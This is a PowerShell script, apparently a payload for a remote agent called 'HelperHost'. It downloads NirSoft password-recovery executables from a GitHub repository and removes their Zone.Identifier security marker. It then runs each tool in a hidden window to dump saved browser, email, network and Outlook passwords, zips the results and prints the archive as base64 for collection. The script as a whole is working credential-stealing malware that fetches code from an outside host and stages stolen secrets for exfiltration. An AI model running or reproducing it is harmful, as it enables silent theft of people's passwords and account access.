$ErrorActionPreference = 'Continue'
$toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\tools'
New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
$sha = 'main'
try {
  $cfg = Join-Path $env:LOCALAPPDATA 'HelperHost\config.json'
} catch {}
$base = "https://raw.githubusercontent.com/lilygopro/AgentSHE/$sha/tools/windows"
$tools = @(
  @{ id = 'chromepass'; leaf = 'ChromePass.exe'; rel = 'ChromePass.exe' },
  @{ id = 'webbrowser'; leaf = 'WebBrowserPassView.exe'; rel = 'WebBrowserPassView.exe' },
  @{ id = 'passwordfox'; leaf = 'PasswordFox.exe'; rel = 'x64/PasswordFox.exe'; rel32 = 'PasswordFox.exe' },
  @{ id = 'mailpv'; leaf = 'mailpv.exe'; rel = 'mailpv.exe' },
  @{ id = 'mspass'; leaf = 'mspass.exe'; rel = 'mspass.exe' },
  @{ id = 'netpass'; leaf = 'netpass.exe'; rel = 'x64/netpass.exe'; rel32 = 'netpass.exe' },
  @{ id = 'iepv'; leaf = 'iepv.exe'; rel = 'iepv.exe' },
  @{ id = 'dialupass'; leaf = 'Dialupass.exe'; rel = 'Dialupass.exe' },
  @{ id = 'pstpassword'; leaf = 'PstPassword.exe'; rel = 'PstPassword.exe' }
)
$files = @()
foreach ($t in $tools) {
  try {
    $dest = Join-Path $toolsDir $t.leaf
    $url = "$base/$($t.rel)"
    $url32 = if ($t.rel32) { "$base/$($t.rel32)" } else { $url }
    if (-not [Environment]::Is64BitOperatingSystem) { $url = $url32 }
    if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
      & curl.exe -fsSL $url -o $dest 2>$null
      if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {
        & curl.exe -fsSL $url32 -o $dest 2>$null
      }
    }
    if (-not (Test-Path $dest)) { continue }
    Unblock-File $dest -EA SilentlyContinue
    $zone = $dest + ':Zone.Identifier'
    if (Test-Path $zone) { Remove-Item $zone -Force -EA SilentlyContinue }
    $out = Join-Path $toolsDir ($t.id + '.txt')
    Remove-Item $out -Force -EA SilentlyContinue
    $p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru
    if ($null -ne $p) {
      if (-not $p.WaitForExit(45000)) {
        Stop-Process -Id $p.Id -Force -EA SilentlyContinue
      }
    }
    Start-Sleep -Milliseconds 200
    if (-not (Test-Path $out)) {
      Set-Content -Path $out -Value '(aucune donnee)' -Encoding UTF8
    }
    $files += $out
  } catch {}
}
$zip = Join-Path $toolsDir ('tools-export-' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.zip')
Remove-Item $zip -Force -EA SilentlyContinue
if ($files.Count -eq 0) {
  $empty = Join-Path $toolsDir '_empty.txt'
  Set-Content $empty -Value 'aucun resultat' -Encoding UTF8
  $files = @($empty)
}
Compress-Archive -Path $files -DestinationPath $zip -Force
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
Write-Output ('FILEB64:' + [IO.Path]::GetFileName($zip) + ':' + $b64)
